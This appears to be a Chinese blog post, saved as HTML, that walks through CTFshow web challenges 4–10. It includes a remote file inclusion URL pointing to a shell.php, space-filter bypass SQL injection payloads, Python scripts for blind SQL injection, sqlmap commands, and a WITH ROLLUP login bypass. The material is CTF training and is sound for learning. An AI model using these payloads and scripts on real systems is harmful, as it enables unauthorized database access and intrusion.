@@ -1,0 +1,328 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>CTFshow刷题-Web(4-14) | B0ter's blog</title><meta name="author" content="B0ter"><meta name="copyright" content="B0ter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言记录以前刷过的CTF题 web4(文件包含)前言一、包含日志，将木马写在日志里面，再蚁剑连接   二、远程文件包含 重新开启一个靶机环境 1https:&#x2F;&#x2F;b297bb10-8978-4c85-a1cc-027ebb8a9015.chall.ctf.show&#x2F;?url&#x3D;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;shell.php   web5（md5弱比较） ctype_alpha — 做">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow刷题-Web(4-14)">
+<meta property="og:url" content="https://md.b0ter.top/post/d77ca5d926244e0294ae1d4d30b49579/index.html">
+<meta property="og:site_name" content="B0ter&#39;s blog">
+<meta property="og:description" content="前言记录以前刷过的CTF题 web4(文件包含)前言一、包含日志，将木马写在日志里面，再蚁剑连接   二、远程文件包含 重新开启一个靶机环境 1https:&#x2F;&#x2F;b297bb10-8978-4c85-a1cc-027ebb8a9015.chall.ctf.show&#x2F;?url&#x3D;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;shell.php   web5（md5弱比较） ctype_alpha — 做">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.vika.cn/space/2023/02/22/d77ca5d926244e0294ae1d4d30b49579">
+<meta property="article:published_time" content="2021-10-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-02-22T10:18:37.911Z">
+<meta property="article:author" content="B0ter">
+<meta property="article:tag" content="CTF&amp;Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.vika.cn/space/2023/02/22/d77ca5d926244e0294ae1d4d30b49579"><link rel="shortcut icon" href="https://s1.vika.cn/space/2023/02/19/6835e65038ce4b3e9781f12e88d3e1a3"><link rel="canonical" href="https://md.b0ter.top/post/d77ca5d926244e0294ae1d4d30b49579/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: B0ter","link":"链接: ","source":"来源: B0ter's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTFshow刷题-Web(4-14)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-22 18:18:37'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/19/204bd14f36324109b3cc026c10b50360" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.vika.cn/space/2023/02/22/d77ca5d926244e0294ae1d4d30b49579')"><nav id="nav"><span id="blog-info"><a href="/" title="B0ter's blog"><span class="site-name">B0ter's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTFshow刷题-Web(4-14)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-10-16T16:00:00.000Z" title="发表于 2021-10-17 00:00:00">2021-10-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTFshow刷题-Web(4-14)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录以前刷过的CTF题</p>
+<h3 id="web4-文件包含-前言"><a href="#web4-文件包含-前言" class="headerlink" title="web4(文件包含)前言"></a>web4(文件包含)前言</h3><p>一、包含日志，将木马写在日志里面，再蚁剑连接</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/d77ca5d926244e0294ae1d4d30b49579" alt="image-20210923220406359"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/c5c49619673740b9b5051ae08976d690" alt="image-20230222173344239"></p>
+<p>二、远程文件包含</p>
+<p>重新开启一个靶机环境</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://b297bb10-8978-4c85-a1cc-027ebb8a9015.chall.ctf.show/?url=http://xxx.xxx.xxx.xxx/shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/c8e452549b78437595dc2c2e18768872" alt="image-20230222173439804"></p>
+<h3 id="web5（md5弱比较）"><a href="#web5（md5弱比较）" class="headerlink" title="web5（md5弱比较）"></a>web5（md5弱比较）</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/f53a57a19863439da81a2adce7386fe7" alt="image-20210923224935827"></p>
+<p>ctype_alpha — 做纯字符检测，检查是否是字母</p>
+<h3 id="web6（过滤空格的sql）"><a href="#web6（过滤空格的sql）" class="headerlink" title="web6（过滤空格的sql）"></a>web6（过滤空格的sql）</h3><p>fuzz得空格被过滤</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/4d52508b60b94a8cb5f8ac68b4114fe0" alt="image-20210923230539331"></p>
+<p>一般空格被过滤有如下替换方法</p>
+<ul>
+<li>&#x2F;**&#x2F;</li>
+<li>()（括号绕过：常用于基于时间延迟的盲注）</li>
+<li>回车(url编码中的%0a)</li>
+<li>&#96;(tap键上面的按钮)</li>
+<li>tap（%0b）</li>
+<li>两个空格</li>
+<li>换行（%0a）</li>
+<li>新的一页（%0c）</li>
+<li>return功能（%0d ）</li>
+</ul>
+<p>后面便是常规注入了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=1&#x27;</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b1,flag,<span class="number">3</span><span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bflag#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;%0aunion%0aselect%0a1,flag,3%0afrom%0aflag#&amp;password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=1&#x27;</span><span class="keyword">union</span><span class="operator">%</span><span class="number">0</span>aselect(<span class="number">1</span>),flag,(<span class="number">3</span>)<span class="keyword">from</span>(flag)#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web7（过滤空格、union的sql盲注）"><a href="#web7（过滤空格、union的sql盲注）" class="headerlink" title="web7（过滤空格、union的sql盲注）"></a>web7（过滤空格、union的sql盲注）</h3><p>利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url = <span class="string">&quot;http://a82d5ba7-9b1c-459c-822f-e30c7219788f.challenge.ctf.show:8080/index.php?id=-1&#x27;/**/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">url</span>):  <span class="comment"># 爆库名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            u = <span class="string">&quot;or/**/ascii(substr(database()/**/from/**/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;#&quot;</span></span><br><span class="line">            s = url + u</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">            r = requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table</span>(<span class="params">url</span>):  <span class="comment"># 爆表名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">128</span>):</span><br><span class="line">                u = <span class="built_in">id</span> = <span class="string">&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    i) + <span class="string">&quot;)/**/from/**/&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;#&quot;</span></span><br><span class="line">                s = url + u</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                r = requests.get(s)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="built_in">print</span>(table_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db(url);</span><br><span class="line">table(url);</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://a82d5ba7-9b1c-459c-822f-e30c7219788f.challenge.ctf.show:8080/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i),<span class="built_in">str</span>(j))</span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span></span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/or/**/ascii(substr(database()/**/from/**/1/**/for/**/1))=100#</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="comment">/**/</span><span class="operator">||</span><span class="comment">/**/</span>ascii(substr((<span class="keyword">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>database()<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">offset</span><span class="comment">/**/</span><span class="number">0</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))<span class="operator">=</span><span class="number">55</span>#</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">0</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="operator">*</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>库名：web7</p>
+<p>跑出三个表名：flag、page、user</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/df786d89ce1b48488aa646632510f6aa" alt="image-20211004224641583"></p>
+<p>利用sqlmap</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://a82d5ba7-9b1c-459c-822f-e30c7219788f.challenge.ctf.show:8080/index.php?id=2&quot; <span class="comment">--technique=B -D web7 --tables  --tamper space2comment.py</span></span><br><span class="line"></span><br><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://a82d5ba7-9b1c-459c-822f-e30c7219788f.challenge.ctf.show:8080/index.php?id=2&quot; <span class="comment">--technique=B -D web7 -T flag -C flag --dump  --tamper space2comment.py</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/1f75785712a840048f61017203997bd6" alt="image-20211004225904757"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/ac9786c071a645f6a1b939e85927ee35" alt="image-20211004230318536"></p>
+<h3 id="web8（多过滤了逗号）"><a href="#web8（多过滤了逗号）" class="headerlink" title="web8（多过滤了逗号）"></a>web8（多过滤了逗号）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and ascii(substr((select database()),1,1))=xx #</span></span><br><span class="line"><span class="string">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database())<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))<span class="operator">=</span>xx #</span><br><span class="line">这应该是substring函数的两种用法</span><br><span class="line"></span><br><span class="line">将limit <span class="number">0</span>,<span class="number">1</span>样式改为limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://a7abce0b-495f-4960-b75c-611363f00c53.challenge.ctf.show:8080/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>按取消获得源码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/f6bcb2f348d7477ba02bf5e4d58f2f37" alt="image-20211006094316453"></p>
+<p>由源码得知注入点在username</p>
+<p>①group by（将结果集中的数据行根据选择列的值进行逻辑分组）<br> 不加group by时的输出如下：<br> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/7d768a1beec446c7bae7b2671ebdd089" alt="在这里插入图片描述"><br> 在使用group by以后会按照password中的值进行排列：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/bd4f170226bc4476b871c0812c844ddd" alt="image-20211006101953229"><br>②with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计)<br>来看实例：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/e1f04870cfed4d7eb61457c97aa8a199" alt="image-20211006102021483"></p>
+<p>结果中将会多出一行，其中password列为null，count（*）为统计和。<br>这里我们就可以通过骚姿势绕过了。<br>其中&#x2F; ** &#x2F; 是为了绕过空格过滤<br>payload:username&#x3D;admin’&#x2F; ** &#x2F;or&#x2F; ** &#x2F;1&#x3D;1&#x2F; ** &#x2F;group&#x2F; ** &#x2F;by&#x2F; ** &#x2F;password&#x2F; ** &#x2F;with&#x2F; **&#x2F;rollup#&amp;password&#x3D;<br>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL&#x3D;&#x3D;NULL)即可满足$password&#x3D;&#x3D;$row[‘password’]的限制成功登陆。<br>登录成功即可显示flag。</p>
